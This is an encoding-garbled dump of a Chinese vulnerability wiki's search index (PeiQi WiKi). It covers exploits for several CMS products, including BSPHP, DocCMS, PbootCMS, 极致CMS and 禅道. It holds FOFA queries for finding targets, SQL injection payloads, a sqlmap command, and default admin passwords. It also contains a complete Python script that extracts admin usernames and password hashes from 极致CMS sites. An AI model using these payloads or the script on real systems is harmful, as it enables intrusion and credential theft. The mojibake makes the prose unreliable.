è´¦æˆ·åä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] BSPHP FOFA [!NOTE] \"BSPHP\" æ¼æ´å¤ç° è®¿é—®å¦‚ä¸‹URLï¼Œæ³„éœ²ç”¨æˆ·åä¸ç™»å½•IP http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0â€˜ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:40 "},"PeiQi_Wiki/CMSæ¼æ´/DocCMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/DocCMS/","title":"DocCMS","keywords":"","body":"PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-02 11:02:37 "},"PeiQi_Wiki/CMSæ¼æ´/DocCMS/DocCMS keyword SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/DocCMS/DocCMS keyword SQLæ³¨å…¥æ¼æ´.html","title":"DocCMS keyword SQLæ³¨å…¥æ¼æ´","keywords":"","body":"DocCMS keyword SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° DocCMS keywordå‚æ•°å­˜åœ¨ SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æ•°æ®åº“ä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] DocCMS FOFA [!NOTE] app=\"Doccms\" æ¼æ´å¤ç° CMSå®˜ç½‘ éªŒè¯POC /search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33 å…¶ä¸­payloadä¸ºä¸‹åˆ—è¯­å¥çš„äºŒæ¬¡Urlç¼–ç  ' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))# PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-02 11:11:25 "},"PeiQi_Wiki/CMSæ¼æ´/PbootCMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/PbootCMS/","title":"PbootCMS","keywords":"","body":"PbootCMS PbootCMS search SQLæ³¨å…¥æ¼æ´ PbootCMS ext_price SQLæ³¨å…¥æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-02 11:36:42 "},"PeiQi_Wiki/CMSæ¼æ´/PbootCMS/PbootCMS search SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/PbootCMS/PbootCMS search SQLæ³¨å…¥æ¼æ´.html","title":"PbootCMS search SQLæ³¨å…¥æ¼æ´","keywords":"","body":"PbootCMS search SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° PbootCMS æœç´¢æ¨¡å—å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚é€šè¿‡æ¼æ´å¯è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] PbootCMS FOFA [!NOTE] app=\"PBOOTCMS\" æ¼æ´å¤ç° æœç´¢æ¡†é¡µé¢ä¸º Payloadä¸º /index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-02 11:30:03 "},"PeiQi_Wiki/CMSæ¼æ´/PbootCMS/PbootCMS ext_price SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/PbootCMS/PbootCMS ext_price SQLæ³¨å…¥æ¼æ´.html","title":"PbootCMS ext_price SQLæ³¨å…¥æ¼æ´","keywords":"","body":"PbootCMS ext_price SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° PbootCMS å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚é€šè¿‡æ¼æ´å¯è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] PbootCMS FOFA [!NOTE] app=\"PBOOTCMS\" æ¼æ´å¤ç° ä¸»é¡µ æµ‹è¯• Payload /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-02 11:36:05 "},"PeiQi_Wiki/CMSæ¼æ´/å‘è´§100/":{"url":"PeiQi_Wiki/CMSæ¼æ´/å‘è´§100/","title":"å‘è´§100","keywords":"","body":"å‘è´§100 å‘è´§100 M_id SQLæ³¨å…¥æ¼æ´ CNVD-2021-30193 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-02 20:42:45 "},"PeiQi_Wiki/CMSæ¼æ´/å‘è´§100/å‘è´§100 M_id SQLæ³¨å…¥æ¼æ´ CNVD-2021-30193.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/å‘è´§100/å‘è´§100 M_id SQLæ³¨å…¥æ¼æ´ CNVD-2021-30193.html","title":"å‘è´§100 M_id SQLæ³¨å…¥æ¼æ´ CNVD-2021-30193","keywords":"","body":"å‘è´§100 M_id SQLæ³¨å…¥æ¼æ´ CNVD-2021-30193 æ¼æ´æè¿° å‘è´§100 M_idå‚æ•°å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œ æ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] å‘è´§100 FOFA [!NOTE] icon_hash=\"1420424513\" æ¼æ´å¤ç° ä¸»é¡µé¢å¦‚ä¸‹ ä½¿ç”¨POC /?M_id=1%27&type=product æ•°æ®åº“å‡ºç°æŠ¥é”™, ä½¿ç”¨Sqlmapæ³¨å…¥ sqlmap -u 'http://xxx.xxx.xxx.xxx/?M_id=11%27&type=product' -p M_id PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-03 00:15:30 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/","title":"æè‡´CMS","keywords":"","body":"æè‡´CMS æè‡´CMS å…¨ç‰ˆæœ¬ä»»æ„ä»£ç æ‰§è¡Œ(åå°æƒé™) æè‡´CMS 1.71 ,1.7 ,1.67 ç‰ˆæœ¬ æ”¯ä»˜æ’ä»¶sqlæ³¨å…¥ æè‡´CMS PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-07 12:10:13 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æè‡´CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ (åå°æƒé™)","keywords":"","body":"æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶(åå°) ç™»é™†åå°æŸ¥çœ‹æ’ä»¶å¤„ï¼Œæœ‰ä¸€ä¸ªåå°ç¼–è¾‘çš„æ’ä»¶ å®‰è£…ä¹‹åè®¾ç½®å¯†ç å¹¶ä½¿ç”¨ [!NOTE] å¦‚æœå·²ç»è®¾æœ‰å¯†ç ï¼Œé‡æ–°å®‰è£…æ’ä»¶å³å¯è§£å†³å¯†ç æœªçŸ¥é—®é¢˜ ä¿®æ”¹ä¸ºphpä»£ç  æˆåŠŸæ‰§è¡Œphpä»£ç çš„å‘½ä»¤ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 21:05:49 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html","title":"æè‡´CMS 1.71 + 1.7 + 1.67 ç‰ˆæœ¬sqlæ³¨å…¥","keywords":"","body":"æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥(æ”¯ä»˜æ’ä»¶) æŸ¥çœ‹ä¸€ä¸‹è¿›è¡Œè¿‡æ»¤çš„å‡½æ•° /** å‚æ•°è¿‡æ»¤ï¼Œæ ¼å¼åŒ– **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://æ•´æ•° return (int)$value; case 1://å­—ç¬¦ä¸² $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://æ•°ç»„ if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://æµ®ç‚¹ return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //è¿‡æ»¤XSSæ”»å‡» function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸² $arr[$key] = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ } else { SafeFilter($arr[$key]); } } } } çœ‹ä¸€ä¸‹æ‰§è¡Œçš„SQLè¯­å¥çš„å‡½æ•° // æŸ¥è¯¢ä¸€æ¡ public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } è·Ÿè¿› findAll å‡½æ•° // æŸ¥è¯¢æ‰€æœ‰ public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } åœ¨è·Ÿè¿›ä¸€ä¸‹getDataå‡½æ•° //è·å–æ•°æ® public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } è·Ÿè¿›queryæ‰§è¡Œå‡½æ•° //æ‰§è¡ŒSQLè¯­å¥å¹¶æ£€æŸ¥æ˜¯å¦é”™è¯¯ public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('æ•°æ®åº“é”™è¯¯ï¼š' . $msg[2] . end($this->filter)); } } çœ‹åˆ°$msg = $this->pdo->errorInfo();è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæŠŠæ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åœ¨é¡µé¢ä¸Šå¹¶æ˜¾ç¤ºå‡ºæ¥å¹¶é€€å‡º ä¸€å¥—åˆ†æä¸‹æ¥æ²¡æœ‰å‘ç°å¯¹sqlè¯­å¥çš„è¿‡æ»¤ï¼Œå¦‚æœå¾—åˆ°çš„æ•°æ®æ²¡æœ‰ç»è¿‡format_paramè¿‡æ»¤ï¼Œä¼šäº§ç”Ÿæ³¨å…¥ ä¾‹å¦‚: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } å¦‚æœç›´æ¥è¿™æ ·GET POST REQUEST å¸¦å…¥æ•°æ®åº“ ä¼šäº§ç”ŸæŠ¥é”™æ³¨å…¥ ä¾‹å¦‚ ./exploit/name=123' (åŠ ä¸€ä¸ªå¼•å·ä¼šæŠ¥é”™ï¼Œå¦‚æœå¼•å·æ²¡è¿‡æ»¤) ç°åœ¨åªéœ€è¦å¯»æ‰¾ç±»å‹æ˜¯è¿™æ ·æ²¡è¿‡æ»¤ç›´æ¥å¸¦å…¥æ•°æ®åº“çš„è¯­å¥å°±è¡Œäº† ç®€å•å¯»æ‰¾ä¸‹å…¶å®è¿™æ ·çš„åœ°æ–¹æŒºå¤šçš„ï¼Œæ‹¿ä¸€ä¸ªä½ç½®ä¸¾ä¾‹å­ è¿™é‡Œæ˜¯ä¸€ä¸ªæ”¯ä»˜æ’ä»¶çš„ä½ç½®ï¼Œè“è‰²æ–¹å—1å¢åŠ ä»£ç æ¨¡æ‹Ÿå¼€é€šæ”¯ä»˜å®åŠŸèƒ½é€šè¿‡éªŒè¯ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°åªä½¿ç”¨[htmlspecialchars]æ¥è¿‡æ»¤äº†xssï¼Œsqlè¯­å¥æ²¡æœ‰è¿‡æ»¤ï¼Œç”¨åˆšåˆšçš„æ–¹æ³•æ¥æ³¨å…¥ å¯ä»¥çœ‹åˆ°çš„ç¡®å‡ºç°äº†sqlè¯­å¥å’Œæ•°æ®åº“é”™è¯¯ ç›´æ¥æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" å®˜ç½‘url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: æè‡´CMS 1.67 - 171 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('é€‰æ‹©ä½¿ç”¨çš„pocï¼š\\n' '1.sqlæ³¨å…¥\\n' '2.ç”¨æˆ·è´­ç‰©è½¦çˆ†ç ´\\n' '3.GET ç½‘ç«™ç®¡ç†å‘˜è´¦å·å¯†ç \\n' '4.é€€å‡º quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('å‚æ•°é”™è¯¯ï¼Œé‡æ–°è¾“å…¥') def poc_1(): ## poc_1 ---> sqlæ³¨å…¥æ¼æ´ç‚¹( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //æ”¯ä»˜å®å…¬é’¥ï¼Œè´¦æˆ·ä¸­å¿ƒ->å¯†é’¥ç®¡ç†->å¼€æ”¾å¹³å°å¯†é’¥ï¼Œæ‰¾åˆ°æ·»åŠ äº†æ”¯ä»˜åŠŸèƒ½çš„åº”ç”¨ï¼Œæ ¹æ®ä½ çš„åŠ å¯†ç±»å‹ï¼ŒæŸ¥çœ‹æ”¯ä»˜å®å…¬é’¥ $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //éªŒè¯ç­¾å $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; ä»˜æ¬¾æˆåŠŸ'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); å‘å¸ƒæ—¶é—´ 2020-05-25]') else: print('å¾—åˆ°çš„æ•°æ®ä¸º:\\n', data) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> ç”¨æˆ·è´­ç‰©è½¦é¡µé¢è·å– (Home/c/UserController.php [orderdetails]) ## æ¼æ´ç‚¹ ---> æ— ç”¨æˆ·cookie id çš„éªŒè¯ ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.8ä»¥ä¸‹å…¨ç‰ˆæœ¬ (å½“å‰æœ€æ–° v1.8 æ›´æ–°æ—¶é—´:6æœˆ30æ—¥) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //è¶…æ—¶æˆ–è€…å·²æ”¯ä»˜ if($order['isshow']==0){ $msg = 'è®¢å•å·²åˆ é™¤'; } if($order['isshow']==3){ $msg = 'è®¢å•å·²è¿‡æœŸï¼Œä¸å¯æ”¯ä»˜ï¼'; } if($order['isshow']==2){ $msg = 'è®¢å•å·²æ”¯ä»˜ï¼Œè¯·å‹¿é‡å¤æ“ä½œï¼'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //å…¼å®¹å¤šæ¨¡å—åŒ– if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) year_day = str(input(\"è¾“å…¥æ—¥æœŸ(ä¾‹å¦‚:20200712):\")) shop = [] # éå†æ‰€æœ‰å‡ºç°çš„ç”¨æˆ·è´­ç‰©è½¦é¡µé¢ for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # æ‰“å°ç»“æœ if 'æ€»é‡‘é¢' in response.text: print('è´­ç‰©è½¦é¡µé¢ï¼š',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> å¾—åˆ°è´¦å·å¯†ç  ( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ ---> æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # ç”¨æˆ·å + å¯†ç  é•¿åº¦ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # å¾—åˆ°è´¦å·å¯†ç ï¼Œå¯†ç md5æ ¼å¼ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # åˆ†å‰²è´¦å·å¯†ç  admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"æˆåŠŸå¾—åˆ°è´¦å·å¯†ç ï¼š\\n\" \"ç”¨æˆ·å:\",admin, \"\\nå¯†ç (md5):\",passwd) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() è´­ç‰©è½¦çˆ†ç ´æ²¡æœ‰åˆ©ç”¨ç‚¹ï¼Œå…³äºå®¡è®¡éƒ¨åˆ†å‚è€ƒæè‡´CMSå®¡è®¡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 21:05:49 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS.html","title":"æè‡´CMS <1.81 ç‰ˆæœ¬ å­˜å‚¨å‹XSS","keywords":"","body":"æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS æ¼æ´å¤ç° ç™»å½•ç®¡ç†å‘˜æ·»åŠ æ¨¡å— æ³¨å†Œç”¨æˆ· ç‚¹å‡»å‘å¸ƒæ–‡ç«  åœ¨æ–‡ç« æ ‡é¢˜å¤„æ’å…¥xss payload å½“ç®¡ç†å‘˜è®¿é—®æ—¶XSSæˆåŠŸ å‚è€ƒ æè‡´CMSä»£ç å®¡è®¡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/","title":"åå®œäº’è”CMS","keywords":"","body":"åå®œäº’è”CMS åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-19 08:46:58 "},"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/åå®œäº’è”CMS/åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´.html","title":"åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´","keywords":"","body":"åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ æ¼æ´æè¿° åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ï¼Œå¦‚ä¸ä¿®æ”¹åˆ™ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç å³å¯ç™»å½•è¶…çº§ç®¡ç†å‘˜ å½±å“ç‰ˆæœ¬ åå®œäº’è”CMS FOFA [!NOTE] body=\"åå®œç½‘ç»œ\" æ¼æ´å¤ç° åŸç‰ˆçš„æºç éœ€è¦ä»˜è´¹ï¼Œå¯æ‰¾åˆ°å…è´¹ç‰ˆçš„æºç  åœ¨ç›®å½•ä¸‹çš„DATAç›®å½•ä¸­æœ‰mdbæ–‡ä»¶, æ‰“å¼€åå¯ä»¥å‘ç°å­˜åœ¨é»˜è®¤çš„ä¸¤ä¸ªç”¨æˆ· [!NOTE] admin/123456 lu123/cui123 ä½¿ç”¨ ç”¨æˆ·lu123 å³å¯ç™»å½•è¶…çº§ç®¡ç†å‘˜ å‚è€ƒæ–‡ç«  åå®œäº’è”0dayåˆ†äº« PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/","title":"ç¦…é“","keywords":"","body":"ç¦…é“ ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325 ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-04 12:14:08 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´.html","title":"ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´","keywords":"","body":"ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° ç¦…é“ 11.6 ç‰ˆæœ¬ä¸­å¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™è¿‡æ»¤ä¸å®Œå–„ï¼Œå¯¼è‡´è°ƒç”¨æ¥å£æ‰§è¡ŒSQLè¯­å¥å¯¼è‡´SQLæ³¨å…¥ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ 11.6 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨dockerç¯å¢ƒæ­å»º docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 è®¿é—® http://xxx.xxx.xxx.xxx:8084 æŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° å…ˆå¯¹ç¦…é“çš„è°ƒç”¨æµç¨‹è¿›è¡Œåˆ†æ,å…ˆæŸ¥çœ‹ç›®å½•ä¸ºwww/index.phpé¦–é¡µæ–‡ä»¶ä¸­ 